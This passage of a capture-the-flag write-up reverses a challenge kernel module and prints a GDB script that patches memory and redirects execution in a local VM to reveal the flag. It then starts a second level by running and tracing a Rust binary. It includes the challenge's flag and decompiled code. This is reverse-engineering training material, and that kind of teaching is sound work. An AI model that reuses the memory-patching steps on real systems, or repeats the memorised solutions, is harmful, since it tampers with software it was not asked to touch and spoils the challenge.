</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>**</span><span class=p>)(</span><span class=kr>__int64</span> <span class=o>*</span><span class=p>))(</span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v5</span> <span class=o>+</span> <span class=mi>24</span><span class=p>)</span> <span class=o>-</span> <span class=mi>96LL</span><span class=p>))(</span><span class=n>v6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>crypto_shash_update</span><span class=p>(</span><span class=n>v7</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>crypto_shash_final</span><span class=p>(</span><span class=n>v7</span><span class=p>,</span> <span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>crypto_destroy_tfm</span><span class=p>(</span><span class=o>*</span><span class=n>v7</span><span class=p>,</span> <span class=o>*</span><span class=n>v7</span> <span class=o>+</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We see that it does a md5 hash. At this point, we can guess that perhaps the <strong>val</strong> variable is an array of 5 md5 hashes. We can verify this assumption by throwing the hashes into <a href=https://crackstation.net/>hash cracker</a>.</p><p><img src=attachments/4a/crackstation.png alt=File></p><p>Perhaps, these are the bytes that is used in our <code>store</code> variable to decrypt the flag?</p><p>If we look back at <code>sub_895</code>, we note that after all 5 checks passes, <code>hook_func_cold()</code> is called. If we look inside <code>hook_func_cold</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>hook_func_cold</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;Here is your flag!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>print_flag</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>check</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>check</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMPOUT</span><span class=p>(</span><span class=mh>0x8A3LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>It seems to call a <code>print_flag()</code> function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__cdecl</span> <span class=nf>print_flag</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>_fentry__</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>the_work</span><span class=p>.</span><span class=n>work</span><span class=p>.</span><span class=n>data</span><span class=p>.</span><span class=n>counter</span> <span class=o>=</span> <span class=mh>0xFFFFFFFE0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>the_work</span><span class=p>.</span><span class=n>work</span><span class=p>.</span><span class=n>entry</span><span class=p>.</span><span class=n>next</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>the_work</span><span class=p>.</span><span class=n>work</span><span class=p>.</span><span class=n>entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>the_work</span><span class=p>.</span><span class=n>work</span><span class=p>.</span><span class=n>entry</span><span class=p>.</span><span class=n>prev</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>the_work</span><span class=p>.</span><span class=n>work</span><span class=p>.</span><span class=n>entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>the_work</span><span class=p>.</span><span class=n>work</span><span class=p>.</span><span class=n>func</span> <span class=o>=</span> <span class=n>dont_need_to_reverse_this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>queue_work_on</span><span class=p>(</span><span class=mh>0x2000LL</span><span class=p>,</span> <span class=n>system_wq</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>the_work</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>which in turn calls a function called <code>dont_need_to_reverse_this</code> <em>(let&rsquo;s take a peek inside)</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>dont_need_to_reverse_this</span><span class=p>(</span><span class=n>work_struct</span> <span class=o>*</span><span class=n>work</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// truncated
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>zzp</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>store</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>store</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>37</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>48</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x63</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>63</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x63</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>crypto_alloc_skcipher</span><span class=p>(</span><span class=s>&#34;xts(aes)&#34;</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=n>v3</span> <span class=o>+</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v3</span> <span class=o>&lt;=</span> <span class=mh>0xFFFFFFFFFFFFF000LL</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=n>v3</span> <span class=o>+</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>crypto_skcipher_setkey</span><span class=p>(</span><span class=n>v3</span><span class=p>,</span> <span class=n>zzp</span><span class=p>,</span> <span class=mi>64LL</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v2</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v1</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v6</span> <span class=o>=</span> <span class=nf>_kmalloc</span><span class=p>(</span><span class=o>*</span><span class=n>v4</span> <span class=o>+</span> <span class=mi>80LL</span><span class=p>,</span> <span class=mi>3264LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>v1</span> <span class=o>=</span> <span class=n>v6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>v6</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v6</span> <span class=o>+</span> <span class=mi>64</span><span class=p>)</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v7</span> <span class=o>=</span> <span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)</span><span class=nf>kmem_cache_alloc_trace</span><span class=p>(</span><span class=n>kmalloc_caches</span><span class=p>[</span><span class=mi>5</span><span class=p>],</span> <span class=mi>3264LL</span><span class=p>,</span> <span class=mi>30LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>v2</span> <span class=o>=</span> <span class=n>v7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>v7</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>v8</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=n>v9</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=n>v10</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=o>*</span><span class=n>v7</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>4</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0xAB</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>v7</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>v9</span> <span class=o>^</span> <span class=mh>0xA5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>v7</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>v9</span> <span class=o>^</span> <span class=mh>0x75</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>v7</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>v10</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x43</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>v7</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>v10</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0xD6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>v7</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x4E</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>v11</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=n>v2</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>store</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0xF2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		  <span class=c1>// truncated
</span></span></span><span class=line><span class=cl><span class=c1></span>		  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>err</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span> <span class=n>i</span> <span class=o>!=</span> <span class=mi>24</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=n>e_1</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>v2</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>o_l</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>v14</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nf>dffqa</span><span class=p>(</span><span class=n>e_1</span><span class=p>,</span> <span class=mh>0x18uLL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>unk_B2F</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>o_l</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;{% raw %}TISC{%s}{% endraw %}</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v14</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>		  <span class=c1>// truncated
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>It seems to decrypt the flag via an AES algorithm using <strong>store</strong> in the generation of the key.</p><h3 id=trying-to-get-the-flag>Trying to get the flag</h3><p><em>if you thought i was going to figure how to trigger hookfunc with the correct parameters, you are wroooooooong</em></p><p>Let&rsquo;s try calling the <code>print_flag()</code> function in a <em>hacky</em> way!</p><p>Since we have the base address of our kernel module @ <code>0xffffffffc0002000</code>, we can get the address of the <code>print_flag()</code> function at <code>0xffffffffc0002800</code>.</p><p>We can directly call this function by running the following command in GDB.</p><pre tabindex=0><code>set $rip=0xffffffffc0002800
continue
</code></pre><p>We can then expect to get our flag in the kernel buffer by running the <code>dmesg</code> command.</p><pre tabindex=0><code>[    2.523109] Loading PALINDROME module...
[ 1960.340722] TISC{(null)}
</code></pre><p>Naturally, our flag is null, since we did our <code>store</code> variable does not contain the correct values.</p><p>To find the address of <strong>store</strong>, we can set a breakpoint inside the <code>dont_need_to_reverse_this</code> function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// address in IDA: 0x0000000000003AD
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>zzp</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>store</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>store</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>37</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>48</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x63</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>zzp</span><span class=p>[</span><span class=mi>63</span><span class=p>]</span> <span class=o>=</span> <span class=n>store</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x63</span><span class=p>;</span>
</span></span></code></pre></div><p>specifically, we want to break at these instructions so we can find the address of store.</p><p>Hence we will set a breakpoint at <code>0xffffffffc00023ad</code>, and then call <code>print_flag</code> again.</p><p>Upon hitting our breakpoint,</p><pre tabindex=0><code> 0xffffffffc00023ad &lt;dont_need_to_reverse_this+237&gt; mov    rax, QWORD PTR [rip+0x1c54]        # 0xffffffffc0004008
</code></pre><p>we see that our pointer to <code>store[1]</code> is at <code>0xffffffffc0004008</code>.</p><pre tabindex=0><code>(remote) gef➤  x/5gx 0xffffffffc0004000
0xffffffffc0004000:     0xffffffffc00030e7      0xffffffffc00030e7
0xffffffffc0004010:     0xffffffffc00030e7      0xffffffffc00030e7
0xffffffffc0004020:     0xffffffffc00030e7
</code></pre><p>If we examine the memory in GDB, we can see that <code>store[0-4]</code> contains pointer to our value in <code>store</code>.</p><p>If we modify our memory as such,</p><pre tabindex=0><code>0xffffffffc0004000 -&gt; 0xffffffffc00030e7 -&gt; &#34;1q&#34;
0xffffffffc0004008 -&gt; 0xffffffffc00030e9 -&gt; &#34;2w&#34;
0xffffffffc0004010 -&gt; 0xffffffffc00030eb -&gt; &#34;3e&#34;
0xffffffffc0004018 -&gt; 0xffffffffc00030ed -&gt; &#34;4r&#34;
0xffffffffc0004020 -&gt; 0xffffffffc00030ef -&gt; &#34;5t&#34;
</code></pre><p>We can change our value in <code>store</code> and thus successfully decrypt our flag.</p><p>Here&rsquo;s the final GDB solve script:</p><pre tabindex=0><code class=language-gdb data-lang=gdb>file ./vmlinux
gef-remote --qemu-user localhost 1234
add-symbol-file ../one.ko 0xffffffffc0002000

set {long}0xffffffffc0004000=0xffffffffc00030e7
set {long}0xffffffffc0004008=0xffffffffc00030e9
set {long}0xffffffffc0004010=0xffffffffc00030eb
set {long}0xffffffffc0004018=0xffffffffc00030ed
set {long}0xffffffffc0004020=0xffffffffc00030ef

set *0xffffffffc00030e7=0x7131
set *0xffffffffc00030e9=0x7732
set *0xffffffffc00030eb=0x6533
set *0xffffffffc00030ed=0x7234
set *0xffffffffc00030ef=0x7435

set $rip=0xFFFFFFFFC0002800

continue
</code></pre><p>and our flag will appear in our kernel buffer as such:</p><pre tabindex=0><code>TISC{1cmp_c0vert_ch4nnel!}
</code></pre><h2 id=level-5a---morbed-morphed-morbed>LEVEL 5A - Morbed, Morphed, Morbed</h2><blockquote><p>Topic: Reverse Engineering</p><p>We&rsquo;ve uncovered a file deployed by PALINDROME with the following message..</p><p>There are several reasons I may deem you morbin-able to be worthy of being morbed. These include, but are not limited to:</p><ul><li>I am very Morby</li><li>I see you being morbin-able</li></ul><p>To prove that you are a morber, un-morb this file!</p><p><em>NOTE</em>: Solving this challenge unlocks level 6!</p><p>Attached File: <a href=attachments/5a/morbed>morbed</a></p></blockquote><p>If we try to run the given program, we get the following output</p><pre tabindex=0><code>⣐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣅⡠⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢹⣿⣇⡀⠀⠀⠀⢀⣤⣤⣤⣾⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀
⢸⣿⣿⣷⡀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⣀⣀⣤⣾
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠉⠙⠉⠉⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⠟⠋⠁⠀⠀
094d859b4df598d6e170ef20a83dd802
thread &#39;main&#39; panicked at &#39;called `Result::unwrap()` on an `Err` value: ErrUnknown(1)&#39;, src/main.rs:84:23
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
Aborted (core dumped)
</code></pre><p>to roughly get an idea of what is going on, we can trace the system calls of this program.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ strace ./morbed
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=c1># truncated</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>write<span class=o>(</span>1, <span class=s2>&#34;\342\243\220\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240\200\342\240&#34;</span>..., 855⣐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class=line><span class=cl>⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class=line><span class=cl>⣿⣅⡠⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class=line><span class=cl>⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class=line><span class=cl>⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
</span></span><span class=line><span class=cl>⢹⣿⣇⡀⠀⠀⠀⢀⣤⣤⣤⣾⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀
</span></span><span class=line><span class=cl>⢸⣿⣿⣷⡀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶
</span></span><span class=line><span class=cl>⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⣀⣀⣤⣾
</span></span><span class=line><span class=cl>⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
</span></span><span class=line><span class=cl><span class=o>)</span> <span class=o>=</span> <span class=m>855</span>
</span></span><span class=line><span class=cl>write<span class=o>(</span>1, <span class=s2>&#34;\342\240\200\342\240\200\342\240\211\342\240\231\342\240\211\342\240\211\342\240\201\342\240\200\342\242\270\342\243\277\342\243&#34;</span>..., 91⠀⠀⠉⠙⠉⠉⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⠟⠋⠁⠀⠀
</span></span><span class=line><span class=cl><span class=o>)</span> <span class=o>=</span> <span class=m>91</span>
</span></span><span class=line><span class=cl>write<span class=o>(</span>1, <span class=s2>&#34;0879757ec64cb13fd33701e8b80236e8&#34;</span>..., 330879757ec64cb13fd33701e8b80236e8
</span></span><span class=line><span class=cl><span class=o>)</span> <span class=o>=</span> <span class=m>33</span>
</span></span><span class=line><span class=cl>clone<span class=o>(</span><span class=nv>child_stack</span><span class=o>=</span>NULL, <span class=nv>flags</span><span class=o>=</span>CLONE_CHILD_CLEARTID<span class=p>|</span>CLONE_CHILD_SETTID<span class=p>|</span>SIGCHLD, <span class=nv>child_tidptr</span><span class=o>=</span>0x7f9fc803fe90<span class=o>)</span> <span class=o>=</span> <span class=m>387308</span>
</span></span><span class=line><span class=cl>mmap<span class=o>(</span>NULL, 4096, PROT_READ<span class=p>|</span>PROT_WRITE<span class=p>|</span>PROT_EXEC, MAP_PRIVATE<span class=p>|</span>MAP_FIXED<span class=p>|</span>MAP_ANONYMOUS, -1, 0<span class=o>)</span> <span class=o>=</span> -1 EPERM <span class=o>(</span>Operation not permitted<span class=o>)</span>
</span></span><span class=line><span class=cl>write<span class=o>(</span>2, <span class=s2>&#34;thread &#39;&#34;</span>, 8thread <span class=s1>&#39;)                 = 8
</span></span></span><span class=line><span class=cl><span class=s1>write(2, &#34;main&#34;, 4main)                     = 4
</span></span></span><span class=line><span class=cl><span class=s1>write(2, &#34;&#39;</span> panicked at <span class=s1>&#39;&#34;, 15&#39;</span> panicked at <span class=s1>&#39;)         = 15
</span></span></span><span class=line><span class=cl><span class=s1>write(2, &#34;called `Result::unwrap()` on an &#34;..., 58called `Result::unwrap()` on an `Err` value: ErrUnknown(1)) = 58
</span></span></span><span class=line><span class=cl><span class=s1>write(2, &#34;&#39;</span>, <span class=s2>&#34;, 3&#39;, )                      = 3
</span></span></span><span class=line><span class=cl><span class=s2>write(2, &#34;</span>src/main.rs<span class=s2>&#34;, 11src/main.rs)             = 11
</span></span></span><span class=line><span class=cl><span class=s2>write(2, &#34;</span>:<span class=s2>&#34;, 1:)                        = 1
</span></span></span><span class=line><span class=cl><span class=s2>write(2, &#34;</span>84<span class=s2>&#34;, 284)                       = 2
</span></span></span><span class=line><span class=cl><span class=s2>write(2, &#34;</span>:<span class=s2>&#34;, 1:)                        = 1
</span></span></span><span class=line><span class=cl><span class=s2>write(2, &#34;</span>23<span class=s2>&#34;, 223)                       = 2
</span></span></span><span class=line><span class=cl><span class=s2>write(2, &#34;</span><span class=se>\n</span><span class=s2>&#34;, 1
</span></span></span><span class=line><span class=cl><span class=s2>)                       = 1
</span></span></span><span class=line><span class=cl><span class=s2>write(2, &#34;</span>note: run with <span class=sb>`</span><span class=nv>RUST_BACKTRACE</span><span class=o>=</span>1<span class=s2>&#34;..., 78note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
</span></span></span><span class=line><span class=cl><span class=s2>) = 78
</span></span></span><span class=line><span class=cl><span class=s2>rt_sigprocmask(SIG_UNBLOCK, [ABRT], NULL, 8) = 0
</span></span></span><span class=line><span class=cl><span class=s2>gettid()                                = 387307
</span></span></span><span class=line><span class=cl><span class=s2>getpid()                                = 387307
</span></span></span><span class=line><span class=cl><span class=s2>tgkill(387307, 387307, SIGABRT)         = 0
</span></span></span><span class=line><span class=cl><span class=s2>--- SIGABRT {si_signo=SIGABRT, si_code=SI_TKILL, si_pid=387307, si_uid=1000} ---
</span></span></span><span class=line><span class=cl><span class=s2>+++ killed by SIGABRT (core dumped) +++
</span></span></span><span class=line><span class=cl><span class=s2>Aborted (core dumped)
